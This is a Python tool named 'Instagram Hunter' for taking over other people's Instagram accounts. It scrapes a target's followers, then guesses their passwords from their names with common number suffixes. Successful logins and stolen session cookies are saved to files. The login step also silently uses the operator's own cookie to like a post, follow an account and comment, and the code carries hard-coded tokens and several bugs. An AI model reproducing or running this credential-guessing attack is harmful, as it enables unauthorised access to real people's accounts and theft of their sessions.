import os, re, sys, time, json, random, requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from time import sleep
#------------------
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
#------------------

#------------------
logo = """-------------------------------------\n[ + ] WELCOME TO MY TOOL\n[ + ] AUTHOR: XOSHNAW SOFTWARE\n[ + ] TOOL INSTAGRAM HUNTER ( UPDATED V2 )\n-------------------------------------"""
#------------------

def login():
    os.system('clear')
    print(logo)
    ___cookie = input(f"{H}[{P} + {H}]{P} Cookie Dane:{K} ")
    if ___cookie in ['', ' ']:
        exit(f"")
    else:
        try:
            ___userid = re.search('ds_user_id=(.*?);', ___cookie);open('Da/user.txt', 'w').write(___userid.group(1))
            ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{___userid.group(1)}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': ___cookie}).json()['user'];open('Da/coki.txt', 'w').write(___cookie)
            print(f"{H}[{P} + {H}]{P} Welcome Bitch:{K} {___roz['full_name']}");___follow___()
        except (AttributeError, KeyError):
            exit(f"{P}[{M}!{P}]{M} Pastikan Cookie Sudah Benar")
        except (ConnectionError):
            exit(f"{P}[{K}!{P}]{K} Koneksi Error")

def ___follow___():
    try:
        ___cookie = open('Da/coki.txt', 'r').read()
        ___session = re.search('sessionid=(.*?);', ___cookie)
        ___teks = random.choice(['Hi','Bye'])
        ___data = {'comment_text': ___teks,'replied_to_comment_id':''}
        with requests.Session() as ses:
            ___like = ses.post('https://www.instagram.com/web/likes/2734317205115382629/like/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text
            ___follow = ses.post('https://www.instagram.com/web/friendships/5398218083/follow/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text
            ___komen = ses.post('https://www.instagram.com/web/comments/2734317205115382629/add/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}, data = ___data).text 
            if '"status":"ok"' in str(___follow):
                print(f"{H}[{P}!{H}]{P} Login Bu");menu()
            else:
                print(f"{P}[{M}!{P}]{M} Cookie Ghalata");sleep(3);os.system('rm -rf Da/coki.txt');login()
    except Exception as e:
        print(f"{P}[{M}!{P}]{M} Cookie Ghalata");sleep(3);os.system('rm -rf Da/coki.txt');login()

def menu():
    try:
        os.system('clear')
        print(logo)
        ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{open("Da/user.txt","r").read()}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Da/coki.txt','r').read()}).json()['user']
        print(f"\n{B}[{P} + {B}]{P} YOUR INSTAGRAM INFO:")
        print(f"{B}[{P} + {B}]{P} NAME:{K} {___roz['full_name']}")
        print(f"{B}[{P} + {B}]{P} USERNAME:{K} {___roz['username']}")
        print(f"{B}[{P} + {B}]{P} FOLLOWERS:{K} {___roz['follower_count']}\n")
    except (IOError):
        print(f"{P}[{M}!{P}]{M} Cookie Invalid");login()
    except (KeyError):
        print(f"{P}[{M}!{P}]{M} Cookie Invalid");os.system('rm -rf Da/coki.txt && rm -rf Da/user.txt');login()
    except (IOError):
        exit(f"{P}[{K}!{P}]{K} Koneksi Error")
    print(f"{B}[{P} 1 {B}]{P} GET USERNAME")
    print(f"{B}[{P} 2 {B}]{P} START CRACK")
    XOSHNAW = input(f"\n{H}[{P} + {H}]{P} CHOOSE :{K} ")
    if XOSHNAW in ['1','01']:
        start()
    elif XOSHNAW in ['2','02']:
        crack()

def start():
    try:
        user = input(f"\n{H}[{P}?{H}]{P} USERNAME INSTAGRAM:{K} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"")
        else:
            url = requests.get(f'https://www.instagram.com/{user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Da/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{H}[{P} + {H}]{P} NAME INSTAGRAM:{K} {url['full_name']}\n")
            ___file = (url['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            urll = ses.get(f'https://i.instagram.com/api/v1/friendships/{url["id"]}/followers/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Da/coki.txt','r').read()}).json()
            for z in urll['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{P}{z['username']}<=>{z['full_name']}")
            print(f"\n{B}[{P} + {B}]{P} NAME FILE:{K} Dump/{___file}")
            input(f"\nEnter");menu()
    except (KeyError):
        exit(f"Error")
    except (ConnectionError):
        exit(f"Error")
    crack()


class crack:
    
    def __init__(self):
        self.kill = 0
        self.ok = []
        self.cp = []
        print(f"\n{H}[{P} 1 {H}]{P} TOOL PASSWORD")
        print(f"\n{H}[{P} 2 {H}]{P} YOUR PASSWORD\n")
        ___pilih = input(f"{B}[{P} + {B}]{P} CHOOSE IT:{H} ")
        if ___pilih in ['4','04']:
            pwx = input(f"{B}[{P}+{B}]{P} Password :{H} ").split(',')
        try:
            os.system('clear')
            self.___dump = input(f"{B}[{P} + {B}]{P} NAME FILE:{H} ")
            self.___file = open(self.___dump, 'r').read().splitlines()
        except (IOError):
            exit(f"{P}[{M}!{P}]{M} File Ghalata")
        try:
            with ThreadPoolExecutor(max_workers=30) as (___hayuk):
                for ___user in self.___file:
                    username, nama = ___user.split('<=>')
                    z = nama.split(' ')
                    if ___pilih in ['1','01']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'12345', z[0]+'1234', z[0]+'123456', z[0]+'1234567', z[0]+'12345678', z[0]+'123456789', z[0]+'1122', z[0]+'112233', z[0]+'11223344', z[0]+'123321', z[0]+'123123', z[0]+'4321', z[0]+'2000', z[0]+'2001', z[0]+'2002', z[0]+'2003', z[0]+'2004']
                    elif ___pilih in ['2','02']:
                        password = pwx
                    else:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
                    ___hayuk.submit(self.__main__, self.___file, username, password)
        except (ValueError):
            exit(f"")
    def __main__(self, user, uid, pwx):
        try:
            ___useragent = open('Da/ua.txt', 'r').read()
        except (IOError):
            ___useragent = ('Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36')
        try:
            for pw in pwx:
                pw = pw.lower()
                ___url = ('https://www.instagram.com/')
                ___login = ('https://www.instagram.com/accounts/login/ajax/')
                ___csrf = requests.get(___url).cookies['csrftoken']
                ___data = {'username': uid,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}',
                'queryParams': {},
                'optIntoOneTap': 'false'}
                ___head = {'User-Agent': random.choice(open("Da/ua.txt","r").read().splitlines()),
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'x-csrftoken': ___csrf}
                with requests.Session() as ses:
                    response = ses.post(___login, data = ___data, headers = ___head).json()
                    if 'userId' in str(response):
                        coki = (f'mid={ses.cookies.get_dict()["mid"]};ig_did={ses.cookies.get_dict()["ig_did"]};ig_nrcb=1;shbid="9776\0541986587953\0541674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809\0541986587953\0541674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken={ses.cookies.get_dict()["csrftoken"]};ds_user_id={ses.cookies.get_dict()["ds_user_id"]};sessionid={ses.cookies.get_dict()["sessionid"]};rur="EAG\0541986587953\0541674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"')
                        try:
                            r = requests.get(f'https://www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Da/coki.txt','r').read()}).json()['graphql']['user']
                            follower = r['edge_followed_by']['count']
                            following = r['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r[ ✅ ] [ GOOD ACCOUNT ] ")
                        print(f"{B}[{P} + {B}]{P} USERNAME:{H} {uid}")
                        print(f"{B}[{P} + {B}]{P} PASSWORD:{H} {pw}")
                        print(f"{B}[{P} + {B}]{P} FOLLOWERS:{H} {follower}")
                        print(f"{B}[{P} + {B}]{P} FOLLOWING:{H} {following}")
                        print(f"{B}[{P} + {B}]{P} COOKIE:{H} {coki}\n")
                        self.ok.append(f"{uid}|{pw}")
                        open('Ok.txt','a').write(f"{uid}:{pw}\n")
                        break
                    elif 'checkpoint_required' in str(response):
                        try:
                            rr = requests.get(f'https://www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Da/coki.txt','r').read()}).json()['graphql']['user']
                            follower = rr['edge_followed_by']['count']
                            following = rr['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r[ ❌ ] [ CHECKPOINT ] ")
                        print(f"{B}[{P} - {B}]{P} USERNAME:{K} {uid}")
                        print(f"{B}[{P} - {B}]{P} PASSWORD:{K} {pw}")
                        print(f"{B}[{P} - {B}]{P} FOLLOWERS:{K} {follower}")
                        print(f"{B}[{P} - {B}]{P} FOLLOWING:{K} {following}\n")
                        self.cp.append(f"{uid}|{pw}")
                        open('Cp.txt','a').write(f"{uid}|{pw}\n")
                        break
                    else:
                        continue
            self.kill +=1
            print(f"{P}[ {P}TESTING{P} ]{P} {self.kill}:{str(len(user))} [ CP ] {len(self.cp)} [ OK ] {len(self.ok)}          ", end='\r')
        except (ConnectionError):
            print(f"{P}[{K}!{P}]{K} Error", end='\r');sleep(7);__main__(self, user, uid, pwx)
        except:__main__(self, user, uid, pwx)

if __name__=='__main__':
    os.system('git pull')
    menu()
